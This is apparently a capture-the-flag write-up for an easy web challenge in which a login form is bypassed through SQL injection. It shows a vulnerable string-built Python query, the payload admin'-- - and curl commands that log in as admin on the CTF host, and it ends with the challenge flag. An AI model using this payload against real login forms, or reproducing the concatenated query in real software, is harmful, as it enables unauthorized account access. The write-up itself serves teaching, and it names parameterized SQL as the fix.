---
title: "baby SQLi"
ctf: "Friendly CTF 2026"
date: 2026-09-28
category: web
difficulty: easy
author: "L-BOH"
---

# baby SQLi

## Summary

The login form accepts SQL syntax in the username. A comment removes the password condition and logs us in as admin.

## Root cause

The challenge source is not distributed, but the vulnerable statement is:

~~~python
query = f"SELECT id, role FROM users WHERE username = '{username}' AND password = '{password}'"
~~~

The username and password are concatenated into SQL source. A quote in either value is therefore parsed as SQL syntax instead of being treated as data. Parameterized SQL would prevent this.

## Vulnerability

The login page responds differently when a quote is placed in the username. This is the usual sign that form input is being inserted into an SQL query. We can terminate the username string and comment out the rest of the query.

## Exploit

Submit:

~~~text
username: admin'-- -
password: anything
~~~

The space after the two dashes starts a SQL comment. The extra dash is only a comment character. The password condition is ignored, so the login succeeds as the existing admin user.

~~~bash
curl -i -c cookies.txt -X POST https://baby-sqli.web1.friendly-ctf.securinets.tn/login \
  --data-urlencode "username=admin'-- -" \
  --data-urlencode "password=x"
curl -b cookies.txt https://baby-sqli.web1.friendly-ctf.securinets.tn/admin
~~~

## Flag

~~~text
Securinets{sql_1njection_1s_4_seri0us_vuln3rabili7y}
~~~
